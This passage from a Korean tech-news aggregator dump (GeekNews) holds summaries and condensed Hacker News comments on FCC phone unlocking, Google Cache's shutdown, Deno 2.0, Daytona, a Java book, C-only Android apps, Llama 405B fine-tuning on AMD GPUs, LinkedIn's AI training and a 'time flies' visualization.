          + AT&T와 T-Mobile은 이 규제를 막기 위해 자원을 사용할 가능성이 높음
          + FCC는 Verizon의 사례를 들어 이 규제를 추진할 가능성이 있음
          + 최종적으로 이 변화가 일어날 가능성이 높음

GN⁺의 정리

     * FCC의 새로운 규칙 제안은 모든 휴대폰을 60일 내에 잠금 해제하도록 요구함
     * AT&T와 T-Mobile은 이 제안에 반대하며, 경제적 부담을 이유로 들고 있음
     * Verizon은 이미 이 규칙을 따르고 있어 제안을 지지함
     * FCC는 이 규제를 적극적으로 추진할 계획이며, 최종적으로 변화가 일어날 가능성이 높음
     * 이 기사는 통신사들의 반응과 FCC의 규제 추진 배경을 이해하는 데 도움이 됨

        Hacker News 의견

     * AT&T의 웹사이트에서 몇 분 만에 오래된 휴대폰을 잠금 해제할 수 있음
          + T-Mobile이나 Consumer Cellular은 이러한 서비스를 제공하지 않음
          + 잠금 해제된 휴대폰은 QLink Wireless 같은 무료 통신사를 사용할 수 있음
          + 이는 주거 불안정한 사람들에게 큰 도움이 됨
     * ""잠금 해제""라는 용어가 세 가지 다른 의미를 가질 수 있음
          + 모든 통신사에서 사용 가능 (SIM 잠금 없음)
          + 루팅/탈옥 가능 (부트로더 루트 신뢰 잠금 없음)
          + 화면 잠금 없음
          + 이 기사에서는 첫 번째 의미를 다루고 있음
     * 통신사 특정 OS 관행이 사라지길 바람
          + T-Mobile에서 구매한 Samsung Galaxy 4는 OS 업데이트를 받지 못했음
          + 현재 가장 중요한 것은 보안 업데이트임
          + 통신사가 보안 업데이트를 방해하는 휴대폰은 구매하지 않을 것임
     * 부트로더 잠금 해제에 관심이 많음
          + 일부 통신사에서 구매한 Google Pixel은 GrapheneOS 설치가 불가능함
          + 이는 통신사가 ""OEM Unlocking""을 비활성화했기 때문임
     * 해외에서 Cricket의 SIM 잠금 때문에 서비스를 받을 수 없었음
          + Cricket에서 정가로 구매한 휴대폰이 6개월 기간이 지나지 않아 잠금 해제가 불가능했음
          + 다른 곳에서 같은 가격으로 구매했다면 잠금 해제된 상태였을 것임
     * 통신사들이 월 할부로 잠금 해제된 휴대폰을 판매할 수 있지 않을까 생각함
          + 할부 계약에 따라 일정 데이터/통화량이 무료로 제공됨
          + 사용자가 통신사를 변경하더라도 할부 계약을 계속 지켜야 함
     * AT&T에서 구매한 안드로이드 휴대폰을 잠금 해제했지만 여전히 AT&T 로고와 소프트웨어가 남아 있음
          + 통신사 변경 후에는 OTA 업데이트를 받을 수 없음
          + 비공식 펌웨어를 플래시하거나 보안 업데이트 없이 사용하는 것 중 하나를 선택해야 함
          + 이는 보안 측면에서 바람직하지 않음
     * 60일 또는 통신사 잠금의 정당성을 이해하지 못함
          + 휴대폰 회사가 구매 대금이 지불되지 않으면 작동하지 않도록 하는 것은 이해할 수 있음
          + 하지만 듀얼 SIM 모드를 2년, 45일, 60일 등으로 제한하는 것은 이해할 수 없음
          + Apple이 이러한 관행에 동참하는 것도 놀라움
     * EU에서는 SIM 잠금이 10년 전쯤 해결되었음을 잊고 있었음
     * ""Unlocking mandate""에 대한 법적 권한이 없다는 의견에 동의함
          + 이는 의회에서 명확한 법적 권한이 필요함
"
"https://news.hada.io/topic?id=16927","Google Cache 완전히 중단","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          Google Cache 완전히 중단

     * 2024년 9월 24일, Google은 Google Cache 기능을 완전히 비활성화함
     * 올해 초, Google은 검색 결과 스니펫에서 캐시 링크를 제거함
     * 몇 주 전, Wayback Machine 링크를 추가함
     * 이제 Google Cache를 직접 볼 수 있는 링크가 완전히 비활성화됨
     * Google의 검색 담당자인 Danny Sullivan은 X에서 다음과 같이 언급함:
          + ""예, 제거되었습니다. 슬프지만, 오래된 기능이었음. 과거에는 페이지 로딩이 불안정했기 때문에 도움이 되었음. 이제는 상황이 많이 개선됨. 그래서 이 기능을 종료하기로 결정함.""
          + ""개인적으로는 About This Result에 @internetarchive 링크를 추가하면 좋겠다고 생각함. 정보 문해력 목표에 부합하고, 페이지가 시간에 따라 어떻게 변했는지 쉽게 볼 수 있게 해줌.""
          + ""Search Console 계정이 있는 사람은 URL Inspector를 사용하여 크롤러가 페이지를 어떻게 보는지 확인할 수 있음.""
     * 대체 방법
          + Wayback Machine
          + Google Search Console의 URL Inspection 도구
          + Google's rich result testing 도구
     * 업데이트
          + 이 이야기가 게시된 후, Google은 캐시 명령어가 더 이상 작동하지 않는다고 확인함
          + Google은 문서에서도 이를 제거함

GN⁺의 정리

     * Google Cache 기능이 완전히 중단됨으로써, 사용자들은 Wayback Machine이나 Google Search Console의 URL Inspection 도구를 사용해야 할 필요가 있음
     * 이 기능의 종료는 웹 페이지 로딩 안정성이 크게 개선되었음을 반영함
     * 비슷한 기능을 제공하는 다른 도구로는 Wayback Machine과 Google Search Console이 있음

        Hacker News 의견

     * Wayback Machine 링크 추가: Internet Archive에 많은 트래픽을 유도하므로 기부가 필요함
          + 협력 중이지만 자세한 내용은 부족함
     * Google 캐시의 중요성: Internet Archive는 주로 사용자가 사이트를 저장하도록 의존함
          + Google 캐시는 더 이상 로드되지 않는 사이트에서 유용했음
     * 캐시 사용 경험: PDF와 Word 문서의 텍스트 버전을 보기 위해 자주 사용했음
     * 캐시 존재에 놀람: Google 검색 결과에서 캐시된 버전을 본 지 오래됨
     * Google의 데이터 보유: Google은 데이터를 보유하지만 다른 사람들은 사용할 수 없게 함
          + Google이 모델 훈련에 사용할 수 있는 이점이 될 수 있음
     * 역사 지우기: 과거를 알지 못하면 역사가 지워짐
          + 조지 오웰의 ""1984"" 인용
     * Google 검색 사용 이유 감소: Google 검색을 사용할 이유가 줄어듦
     * Internet Archive의 API 접근: AI 훈련을 위해 데이터를 제공할 수 있음
          + 사이트 소유자에게도 이익이 될 수 있음
     * 추억: WordPress를 새로운 서버로 이전할 때 Google 캐시가 블로그 복원에 도움을 줌
     * 제품 지원 검색: 회사들이 페이지를 자주 이동시키므로 Google 캐시가 유용했음
"
"https://news.hada.io/topic?id=16856","Simple Icons - 인기 브랜드 로고 SVG 아이콘 3000개","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 Simple Icons - 인기 브랜드 로고 SVG 아이콘 3000개

     * 3198개의 유명 회사 및 제품들 아이콘을 제공
          + 흑백 SVG, 컬러 SVG, PDF
     * 검색, 정렬, 다운로드 기능 제공
     * JSDelivr/Unpkg CDN 에서 사용 가능
     * npm 패키지로도 제공

GN⁺의 정리

     * Simple Icons는 3198개의 인기 브랜드용 무료 SVG 아이콘을 제공하여 웹 개발자들에게 유용함
     * 브랜드별로 색상 코드와 가이드라인을 제공하여 일관된 디자인을 유지할 수 있음
     * GitHub에서 오픈 소스로 관리되어 누구나 기여할 수 있는 장점이 있음
     * 비슷한 기능을 가진 프로젝트로는 Font Awesome과 Material Icons가 있음
"
"https://news.hada.io/topic?id=16924","Deno 2.0 Release Candidate","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       Deno 2.0 Release Candidate

     * 지난달에 마지막 1.x 버전인 1.46을 출시했고, 이제 최종 버전에서 기대하는 모든 기능이 포함된 2.0 RC 를 공개

주요 변경

     * 글로벌 변수에 대한 변경:
          + window가 없어짐. globalThis 나 self를 대신 사용
          + process 글로벌 변수가 가 추가되어 node:process 임포트가 필요 없어짐
     * 의존성 관리 :
          + deno add : 서브 경로를 가진 지정자 처리
          + deno install --entrypoint 특정 모듈의 모든 의존성 설치
          + deno remove 명령으로 의존성 빠르게 제거
          + 의존성 관련 에러 메시지 개선
     * 권한 시스템 변경
          + Deno.errors.NotCapable 에러 추가
          + Deno.mainModule이 --allow-read 권한 필요 없어짐
          + --allow-hrtime 플래그 제거됨
          + --allow-run 플래그 변경
     * API 변경
          + 몇몇 API가 안정화됨 (WebGPU, Deno.dlopen() 등)
          + 많은 Deno API들이 제거 또는 소프트 deprecate됨
     * 커맨드 라인 인터페이스 변경
          + deno bundle, deno vendor 서브 명령 제거됨
          + 몇몇 CLI 플래그가 deprecate됨
          + DENO_LOG 환경변수로 디버그 로깅 활성화 가능
     * Import Assertions 지원이 제거되고 Import Attributes로 대체됨
     * TypeScript 5.6으로 업데이트됨
"
"https://news.hada.io/topic?id=16887","Daytona - 오픈소스 개발환경 관리자","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        Daytona - 오픈소스 개발환경 관리자

     * 단 1번의 명령어로 모든 인프라에서 완전히 구성된 개발 환경을 설정해주는 도구
     * 어디서나 실행 가능: 로컬, 원격, 클라우드 기반, 물리적 서버, VM 등 어떤 머신에서든 개발 환경을 구축하고 x86 또는 ARM 등 어떤 아키텍처에서도 실행 가능
     * Config 파일 지원: 현재는 Dev Container를 지원하며, DevFile, Nix & Flox로 확장 가능
     * Prebuild 시스템: 환경 설정 시간을 획기적으로 단축
     * IDE 지원: VS Code & JetBrains를 로컬에서 구성없이 바로 사용할 수 있도록 원활하게 지원하며, 추가적인 편의성을 위해 내장 Web IDE 포함
     * Git 제공자 통합: GitHub, GitLab, Bitbucket, Bitbucket Server, Gitea, Gitness, Azure DevOps & AWS CodeCommit을 연결할 수 있어 워크스페이스에서 리포지토리 브랜치 또는 PR 풀과 커밋을 쉽게 수행 가능
     * 다중 프로젝트 작업 공간: 동일한 작업 공간에서 여러 프로젝트 리포지토리를 지원하여 마이크로 서비스 아키텍처를 개발하기 쉬움
     * 리버스 프록시 통합: 역방향 프록시 기능을 활용하여 협업을 가능하게 하고 피드백 루프를 간소화. 방화벽 뒤에서도 프리뷰 포트와 Web IDE에 원활하게 접근 가능
     * 확장성: 플러그인 또는 프로바이더 개발로 확장성 제공. 또한 Go 뿐만 아니라 모든 동적 언어에서 가능
     * 보안: 클라이언트 머신과 개발 환경 간에 VPN 연결을 자동으로 생성하여 완전히 안전한 연결 보장
     * 모든 포트: VPN 연결을 통해 개발 환경의 모든 포트에 액세스할 수 있어 SSH 연결을 통해 포트 전달을 설정할 필요가 없음

   안녕하세요, 이건 사용하기에 반가운 놀라움이었어요. GitHub 리포에서 500명의 새로운 뷰를 얻었고, 관심을 갖게 됐어요. 저는 Daytona의 성장 책임자이고, Google Translate로 번역할 수만 있다면 기꺼이 질문에 답할 거예요. :-D
"
"https://news.hada.io/topic?id=16907","Show HN: Data Oriented Programming in Java ","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               Show HN: Data Oriented Programming in Java

     * 이 책은 Java에서 효과적인 개발이 무엇인지에 대한 모든 것을 요약한 것임
     * 데이터를 ""단순한 데이터""로 조직하는 방법과 그로 인해 발생하는 놀라운 이점에 대해 다룸
     * 데이터를 중심으로 구축된 프로그램은 더 간단하고, 작으며, 이해하기 쉬움

Java의 변화

     * Java는 최근 몇 년 동안 급격히 변화했음
     * 데이터 지향 프로그래밍을 지원하는 새로운 언어 기능(레코드, 패턴 매칭, with 표현식, 합 및 곱 타입)을 도입했음
     * 그러나 이 책은 도구에 관한 것이 아님
     * 도구를 공부하는 것만으로는 집을 짓는 방법을 배울 수 없음
     * 이 책은 집 짓기에 초점을 맞추고 있음
     * 토지를 선택하고, 기초를 놓고, 어떤 폭풍에도 견딜 수 있는 집을 짓는 방법을 설명함

DoP의 기본 아이디어

     * DoP는 매우 간단한 아이디어에 기반을 두고 있음
     * ""표현은 프로그래밍의 본질이다""라는 개념은 컴퓨팅의 시작부터 사람들이 재발견해온 것임
     * 도메인의 데이터를 잘 캡처하면 시스템의 나머지 부분이 자연스럽게 자리 잡는 경향이 있음
     * 이 책은 현재 초기 접근 단계에 있음
     * 피드백을 듣고 싶음
     * 10월 9일까지 코드 mlkiehl을 사용하면 50% 할인을 받을 수 있음

GN⁺의 정리

     * 이 책은 Java에서 데이터 지향 프로그래밍의 중요성과 이점을 강조함
     * 데이터 중심의 접근 방식이 프로그램을 더 간단하고 이해하기 쉽게 만듦
     * Java의 최신 기능을 활용하여 더 나은 프로그램을 작성하는 방법을 설명함
     * 데이터 지향 프로그래밍에 관심 있는 개발자에게 유용할 것임
     * 유사한 기능을 가진 다른 책으로는 ""Clean Code""와 ""Effective Java""가 있음

        Hacker News 의견

     * 기술 서적을 쓴 경험이 있는 사람으로서 축하의 말을 전함
          + 첫 책이라면, 이는 사랑의 노동임을 배우고 있을 것임
          + Clojure 덕분에 ""데이터 지향 프로그래밍""에 노출되었음
          + Java의 최근 혁신이 이를 더 쉽게 만들어줌
          + 책을 살펴볼 예정이며, 성공을 기원함
     * 책을 구매하려 했으나 오류 발생
          + Java의 새로운 언어 기능들이 여전히 ""미리보기"" 상태인 상황에 대해 어떻게 대처했는지 궁금함
          + 예를 들어, String Templates는 JDK 23에서 제거됨
     * 책을 구매하고 첫 장을 읽었음
          + 첫 장이 매우 좋았음
          + Record types, switch statements 등의 새로운 기능이 Java 프로그래머들이 타입을 더 자주 생각하게 만들 것임
     * 기술 편집자가 Brian Goetz임을 언급하며 관심을 보임
     * 축하의 말을 전하며 Reddit의 Java 커뮤니티에 게시할 것을 권장함
     * 책을 완성한 것에 대해 축하하며, 첫 장에서 혼란스러운 문장을 지적함
          + ""only cost was some time""이라고 수정 제안
          + 함수형 접근 방식을 채택하면 최상의 패턴을 찾을 수 있다고 생각함
          + 데이터 속성은 주로 ""리프 노드""로 소비되며, 타입은 크게 중요하지 않음
          + 진화적 아키텍처를 수용하면 데이터 정의를 처음부터 정확히 할 필요는 없음
          + 책에서 이를 어떻게 적용했는지 배우기를 기대함
     * 초기 접근을 시작한 것에 대해 축하하며, Clojure와 F#에서 데이터 지향 프로그래밍을 알고 있음
          + Java에서 이를 어떻게 접근했는지 궁금하여 전자책을 구매함
          + 책의 완성을 기원함
     * 책을 완성한 것에 대해 축하하며, 과거에 기술 서적을 쓴 경험을 공유함
          + 과거 Java 서적들이 두꺼웠던 시절을 회상함
          + ""Java -- the Good Parts""라는 얇은 책을 언급함
     * 축하의 말을 전하며, 현대 Java 책을 찾는 사람들을 위해 자신이 작업 중인 책을 소개함
          + Flavour 프레임워크를 사용하여 Java로 싱글 페이지 앱을 만드는 방법을 설명함
          + 플러그인이나 확장 없이 99.9% 순수 Java로 작성됨
          + 샘플 코드와 관련 팟캐스트 에피소드 및 데모 링크를 제공함
"
"https://news.hada.io/topic?id=16898","Rawdrawandroid – Java 없이 C와 Make로 안드로이드 앱 개발하기","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             Rawdrawandroid – Java 없이 C와 Make로 안드로이드 앱 개발하기

     * C 코드를 Android에서 실행하고 싶은가요?
     * 이 프레임워크는 약 2초 만에 APK를 생성하고 설치 및 자동 실행할 수 있으며, APK 크기는 약 25kB임
          + API 30(Android R+)에서는 ARM64 + ARM32를 지원하기 위해 45kB임.
     * 이 프레임워크의 데모는 다음을 포함함:
          + OpenGL ES 지원 창 만들기
          + 가속도계/자이로 입력, 멀티 터치
          + 키 입력을 위한 Android 키보드
          + APK에 애셋 파일을 저장하고 AAssetManager로 읽기
          + 사운드 사용과 같은 권한 지원
          + USB 장치에 직접 접근
     * 면책 조항: 이 코드는 사용자의 책임 하에 사용해야 함. 상업용 앱 제작에 문제가 있을 수 있음.

Why?

     * 때로는 정상적인 방식에 맞지 않는 일을 하고 싶음
          + 온라인에서의 모든 논의는 정상적인 프로세스를 사용하는 것에 집중함
          + 이러한 프로세스는 변경되어 특정 작업을 수행하고 최신 상태를 유지하기 어려움
          + Makefile을 사용하면 실행되는 명령을 정확히 확인하고 사용자 정의 규칙을 추가하며 빌드를 조정할 수 있음
     * C는 보편적인 언어임
          + Rawdraw는 ESP8266부터 RaspberryPi, Windows, Linux, 심지어 Android까지 모든 것에서 작동함
          + 코드를 한 번 작성하면 어디서나 사용할 수 있음
     * 빌드 프로세스를 콩깍지로 채우지 않으면 중요한 부분만 남게 됨
          + 이는 개발, 배포 등을 용이하게 만들어 줌
          + 모든 것이 훨씬 적은 시간이 소요됨
     * 이는 또한 인터넷 상의 Luddite들에게 한 방 먹이는 것과도 관련이 있음
          + Stack Overflow 질문에 ""그것은 불가능하다"" 또는 ""당신은 잘못하고 있다""라고 게시하는 사람들
          + JNI에서 권한을 요청하는 것은 ""Java에서 해야 한다""는 등의 어리석은 것들
          + 무엇이 가능하고 불가능한지에 대한 의견에 전혀 관심이 없음
          + 이것은 컴퓨터 과학임. 제한이 없음. 원하는 대로 할 수 있음. 단지 비트일 뿐임. 당신은 나를 소유하지 않음

        Hacker News 의견

     * ""내가 원하는 건 뭐든지 할 수 있음. 그냥 비트일 뿐임. 넌 날 소유하지 않음."" 공감함
     * Android 개발에서 Java와 Kotlin 생태계가 불편함. Java는 쓰기 힘든 언어이고, Kotlin은 덜 나쁘지만 빌드 도구와 패키지 관리, IDE 사용이 번거로움. 저자에게 감사함
     * Android Studio 설치가 필요해 보임. Android SDK만 다운로드할 수 있는 방법이 있는지 궁금함
          + Makefile을 잠깐 봤을 때 Gradle을 피한 것 같지만, Java로 작성된 다른 도구들을 호출함
          + Gradle 없이 Flutter 앱을 빌드하는 방법을 보고 싶음
     * C++/OpenGL ES 엔진을 크로스 플랫폼으로 개발했던 기억이 만족스러웠음
     * 이 방법은 OpenGL을 통해 UI를 제공하고 Android 시스템과 많이 상호작용하지 않는 애플리케이션에 유용함
          + NDK는 전통적인 Java Android 애플리케이션에서 속도를 높이기 위해 작은 C 코드를 작성하는 데 사용됨
          + 이 해킹은 전체 화면에서 실행되는 OpenGL 앱을 순수 C로 작성할 수 있게 함
          + 키보드, ADC 입력, USB와 같은 것들에 제한된 접근을 제공함
          + Android 프레임워크를 C로 재구현하지 않으며, NDK는 NDK 코드가 프레임워크와 상호작용할 수 있는 제한된 접근을 제공함
          + 주요 사용 사례는 크로마 추출을 기반으로 한 실시간 오디오 반응 시각화를 지원하는 프로그램임
     * XCode나 Android Studio를 사용할 때마다 웹 개발자들이 Vite 덕분에 얼마나 운이 좋은지 상기하게 됨
          + 모든 것이 잘 작동함. 간단한 플러그인 시스템으로 무엇이든 통합할 수 있음
          + 필요한 플러그인이 없을 때는 쉽게 커스텀 플러그인을 만들 수 있었음
          + Vite가 고장 나면 완전히 망함. 다른 방법을 찾거나 패치가 나올 때까지 기다려야 함. Vite 내부를 스스로 고치는 것은 거의 불가능함
     * Elon 같은 자금이 많은 사람이 Linux를 모바일에서 작동하게 해야 함. 진행 중인 노력은 있지만 진전이 느림. 이중 독점을 깨고 이런 작업을 훨씬 쉽게 만들 것임
     * Lua를 이 시스템에 내장해 고수준 로직을 작성하면, 접근성 지원이 많이 필요하지 않은 게임이나 미디어 플레이어 같은 것에 유용할 것임
          + 성능이 중요한 부분은 C 라이브러리를 쉽게 연결하거나 직접 C 코드를 작성할 수 있음
          + (그런 다음 핵심을 점진적으로 Zig로 다시 작성함)
     * Java/Kotlin 도구는 모바일 개발에 최악임. 다른 훌륭한 언어와 도구들이 많은데도 여전히 이를 유지하는 이유를 모르겠음. Google이 Android 개발을 위해 Go를 네이티브 대안으로 제공하지 않은 이유를 이해할 수 없음
     * Make를 아직도 사용하는 사람들에게 놀람. 지난 20년 동안 다른 언어들이 만들어졌다는 것을 모르는 것 같음
"
"https://news.hada.io/topic?id=16912","AMD GPU로 Llama 405B 미세 조정","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       AMD GPU로 Llama 405B 미세 조정

Felafax BlogTune Llama3 405B on AMD MI300x (우리의 여정)

  소개

     * 오픈 소스 모델이 커지면서 대규모 AI 훈련을 처리할 강력한 인프라의 필요성이 커짐
     * Felafax는 AMD GPU에서 LLaMA 3.1 405B 모델을 미세 조정하여 AMD 하드웨어의 효율성을 입증함
     * 모든 작업을 GitHub에 오픈 소스로 공개함
     * AMD MI300X GPU는 NVIDIA AI 하드웨어에 비해 높은 성능을 제공함
     * TensorWave의 지원으로 프로젝트가 가능했음

  JAX란 무엇이며 왜 선택했는가

     * JAX는 NumPy와 유사한 API, 자동 미분, Google's XLA 컴파일러를 결합한 강력한 머신러닝 라이브러리임
     * 모델 병렬 처리를 위한 우수한 API를 제공하여 대규모 모델 훈련에 이상적임

    JAX의 장점

     * 순수 함수: JAX는 순수 함수를 작성하도록 권장하여 코드의 구성, 디버깅, 읽기가 쉬워짐
     * 고급 병렬 처리: JAX의 유연한 JIT API는 대규모 훈련에 필수적인 고급 데이터 및 모델 병렬 처리를 지원함
     * 깨끗한 코드베이스: JAX의 설계 철학은 하드웨어 플랫폼 간에 이식 가능한 코드를 작성하도록 장려함

    JAX가 비-NVIDIA 하드웨어에서 뛰어난 이유

     * 하드웨어 독립적 접근: JAX는 XLA 컴파일러를 활용하여 하드웨어 독립적인 중간 표현으로 계산을 컴파일함
     * 플랫폼 독립적 최적화: XLA 컴파일러는 하드웨어와 독립적으로 최적화를 수행함
     * 간편한 이식성: JAX를 사용하면 NVIDIA에서 AMD로 전환할 때 코드 변경이 최소화됨

  AMD GPU에서 JAX 설정

     * Docker 이미지를 가져오고 컨테이너를 시작한 후 설치를 확인함
     * AMD MI300x GPU 8개를 사용하여 LLaMA 405B 모델을 훈련함

  LLaMA 405B 훈련: 성능 및 확장성

     * JAX를 사용하여 AMD GPU에서 LLaMA 405B 모델을 훈련함
     * LoRA 미세 조정을 통해 모델 가중치와 LoRA 매개변수를 bfloat16 정밀도로 조정함
     * 모델 크기: 약 800GB의 VRAM을 차지함
     * LoRA 가중치 및 옵티마이저 상태: 약 400GB의 VRAM을 차지함
     * 총 VRAM 사용량: 약 1200GB
     * 훈련 속도: 초당 약 35 토큰
     * 메모리 효율성: 약 70% 유지
     * 확장성: JAX를 사용하여 8개의 GPU에서 거의 선형적으로 확장됨

  우리의 훈련 설정

     * LLaMA 3.1을 PyTorch에서 JAX로 변환함
     * 모델 로딩 및 매개변수 샤딩을 통해 효율적으로 분산함

    JAX에서 매개변수 샤딩

     * JAX의 디바이스 메쉬 기능을 사용하여 8개의 AMD GPU에 모델을 효율적으로 분산함
     * 매개변수 샤딩 규칙을 정의하여 각 텐서의 차원을 메쉬 축에 따라 샤딩함

    LoRA 훈련 구현

     * LoRA는 가중치 업데이트를 저랭크 행렬로 분해하여 훈련 가능한 매개변수 수를 줄임
     * LoRADense 레이어를 구현하여 LoRA 매개변수를 포함함
     * LoRA 매개변수를 효율적으로 분산하여 메모리 사용량과 계산 효율성을 최적화함

  결론

     * AMD GPU와 JAX를 사용하여 LLaMA 3.1 405B 모델을 미세 조정하는 경험이 매우 긍정적이었음
     * JAX의 강력한 병렬 처리 기능과 하드웨어 독립적 접근 방식을 활용하여 모델을 효율적으로 분산함
     * AMD GPU가 대규모 AI 훈련을 위한 강력한 대안임을 입증함
     * GitHub 저장소에서 전체 코드를 확인하고 직접 실행할 수 있음

GN⁺의 정리

     * 이 기사는 AMD GPU와 JAX를 사용하여 대규모 AI 모델을 효율적으로 훈련하는 방법을 설명함
     * AMD 하드웨어가 NVIDIA에 비해 비용 효율적인 대안임을 강조함
     * JAX의 하드웨어 독립적 접근 방식이 코드 이식성을 높이고 유지보수를 용이하게 함
     * 대규모 모델 훈련에 관심 있는 사람들에게 유용한 정보와 실습 코드를 제공함
     * 유사한 기능을 가진 프로젝트로는 NVIDIA의 CUDA와 PyTorch가 있음

        Hacker News 의견

     * JAX를 사용하여 Llama3.1 405B 모델을 8xAMD MI300x GPU에서 미세 조정한 성과 공유
          + JAX의 고급 샤딩 API 덕분에 뛰어난 성능을 달성함
          + 블로그 포스트와 오픈 소스 코드 링크 제공: GitHub 링크
          + NVIDIA 하드웨어가 아닌 TPU, AMD, Trainium에서 LLM을 미세 조정하고 서비스하는 AI 인프라를 구축하는 스타트업임
          + 많은 회사들이 AMD GPU에서 PyTorch를 작동시키려고 하지만, 이는 어려운 길이라고 판단함
          + PyTorch는 NVIDIA 생태계와 깊이 연관되어 있어 비-NVIDIA 하드웨어에서 작동시키려면 많은 수정이 필요함
          + JAX는 비-NVIDIA 하드웨어에 더 적합하다고 믿음
          + JAX에서는 ML 모델 코드가 하드웨어 독립적인 HLO 그래프로 컴파일되고, XLA 컴파일러가 하드웨어 특정 최적화를 수행함
          + 동일한 JAX 코드를 Google TPU와 AMD GPU에서 변경 없이 실행 가능함
          + 회사 전략은 JAX로 모델을 포팅하고, XLA 커널을 활용해 비-NVIDIA 백엔드에서 최대 성능을 추출하는 것임
          + Llama 3.1을 PyTorch에서 JAX로 처음 포팅했으며, 이제 동일한 JAX 모델이 TPU와 AMD GPU에서 잘 작동함
          + 비전과 저장소에 대한 의견을 듣고 싶어함
     * 메모리 제약을 극복하고 JIT 컴파일된 버전을 실행하는 방법 탐구 제안
          + 추가적인 성능 향상을 가져올 수 있을 것임
     * AMD GPU와 ROCm 지원에 대한 경험 공유
          + 1년 전 AMD GPU와 ROCm 지원을 시도했으나, AMD가 NVIDIA를 따라잡기에는 아직 멀었다고 느낌
          + JAX를 선택한 것은 흥미로운 접근법이지만, PyTorch에서 벗어나는 데 어떤 어려움이 있었는지 궁금함
     * 405B 모델의 추론 측면에서 실험한 경험 공유
          + 'torch.cuda'가 그렇게 나쁘지 않다고 생각함
          + AMD 버전의 PyTorch가 이를 번역해주기 때문에 이름 문제일 뿐이라고 판단함
          + rocm:pytorch 컨테이너를 사용하는 것이 rocm:jax 컨테이너를 사용하는 것만큼 쉬움
          + 성능 데이터가 많이 게시되지 않았음을 지적함
          + MFU(모델 활용률) 수치를 궁금해함
     * 성능 데이터의 부재에 대한 질문
          + AMD GPU의 대량 주문으로 인해 가치를 추출할 가능성에 대한 의문 제기
          + ""아니오""라는 인상을 받음
     * Obsidian(노트 테이킹 앱)이 왜 이 일을 하는지에 대한 의문
          + 처음에는 Obsidian의 게시물인 줄 알았음
          + GitHub.com과 GitHub.io를 아직 구분하지 않은 이유에 대한 의문
     * @dang에게 URL에 사용자 이름 포함 요청
          + 이 게시물은 Obsidian 자체가 아닌 사용자 생성 블로그에 관한 것임
"
"https://news.hada.io/topic?id=16837","LinkedIn, 모든 사용자 콘텐츠로 AI 도구 훈련","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     LinkedIn, 모든 사용자 콘텐츠로 AI 도구 훈련

        Hacker News 의견

     * AI 모델에 대한 연민을 느끼는 사람 있음
          + 다른 AI 모델들은 진정한 콘텐츠로 훈련되지만, 이 AI는 얕은 콘텐츠로 사회화됨
          + 사회적으로 어색한 AI에 대한 연민
     * AI가 리더십과 드롭쉬핑에 대해 배우게 될 것이라는 의견 있음
     * LinkedIn은 명함 및 이력서 저장 사이트라는 의견 있음
          + 단순한 프로필 연결과 일자리 매칭 기능만으로도 LinkedIn이 될 수 있음
          + Facebook이나 Twitter처럼 보이기 위해 추가 기능을 제안해야 함
          + LinkedIn 피드는 사람들이 읽고 싶어하지 않기 때문에 AI 생성 콘텐츠로 채워지는 것이 괜찮음
          + LinkedIn의 콘텐츠는 보험 브로셔의 행복한 가족 사진과 같음
          + 소셜 네트워크는 스크롤 가능한 콘텐츠가 필요함
     * LinkedIn이 사용자 데이터와 콘텐츠로 AI 모델을 훈련시키는 경우, 사용자가 해당 모델을 무료로 받아야 한다는 의견 있음
          + LinkedIn은 모델 훈련에 대한 명시적 허가를 받아야 함
     * LinkedIn 설정 페이지 링크를 공유하는 사람 있음
     * Facebook의 옵트아웃과 비슷하게, LinkedIn의 옵트아웃도 앞으로 게시하는 것만 적용될 것이라는 의견 있음
          + 이미 게시된 내용은 훈련 세트에 포함되어 제거되지 않음
          + 이러한 행동에 대한 불만을 표시하는 유일한 방법은 자동 옵트인 서비스를 사용하지 않는 것임
     * 기본적으로 활성화된 개인정보 보호 서비스와 푸시 알림에 대해 불만을 가진 사람 있음
          + 모든 것을 비활성화했지만, 새로운 기본 활성화 기능이 생기는 것에 대해 불만
     * LinkedIn 피드 콘텐츠가 실제 사람들에 의해 작성된 것이라고 생각하지 않았다는 의견 있음
          + AI 콘텐츠가 잘 어울릴 것이라는 의견
     * LinkedIn 피드의 NL 통합 검색을 개선한 PM을 만난 사람 있음
          + 최근 몇 주 동안 검색 기능이 크게 개선되었음을 느꼈음
          + 이제 Google 대신 LinkedIn 검색 창에 쿼리를 입력하면 정확한 결과를 얻을 수 있음
          + 이 기능에 만족하는 사람 있음
     * AI를 사용하여 LinkedIn 콘텐츠를 생성하는 사람 있음
"
"https://news.hada.io/topic?id=16901","Show HN: 시간의 흐름","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            Show HN: 시간의 흐름

     * 이 기사는 ""time flies""라는 프로젝트에 대한 내용임
     * Koen van Gilst가 만들었고, Menno Ankersource의 아이디어를 바탕으로 함
     * GitHub에서 소스를 확인할 수 있음

GN⁺의 정리

     * ""time flies"" 프로젝트는 시간 관리와 관련된 유용한 도구임
     * GitHub에서 소스를 제공하여 누구나 접근하고 수정할 수 있음
     * 이 프로젝트는 시간 관리에 어려움을 겪는 사람들에게 특히 유용할 것임
     * 비슷한 기능을 가진 다른 프로젝트로는 ""Toggl""과 ""RescueTime""이 있음

        Hacker News 의견

     * ""Tempus Fugit""는 라틴어로 ""시간은 날아간다""는 의미이며, 시계의 문자판에서 자주 볼 수 있음
     * 전화기를 흔들면 파리가 흩어질 것이라고 예상함
     * 또 다른 스토아 철학에서 영감을 받은 생명 시계 시각화가 있음
          + LifeSlay
     * 재미있는 시각화임
     * 처음에는 올해 Pax에서 즐겼던 재미있는 게임 TimeFlies인 줄 알았음
     * 이 아이디어는 말장난에서 시작되어 역으로 작업된 것 같음. 꽤 웃김
          + 팁: 캔버스를 클릭하면 파리를 ""방해""할 수 있음
     * 매우 간단하고 우아함. 조금 더 움직임이 있으면 좋은 스크린세이버가 될 것 같음
     * 정말 웃김. 내가 이 생각을 했으면 좋았을 텐데. 잘 실행됨
     * 이걸 정말 좋아함! 저자가 어떻게든 ""nerd-sniped""된 결과일 수도 있음
     * 처음에는 무작위 버즈에서 무언가를 보게 되는 착시 현상 중 하나인 줄 알았음
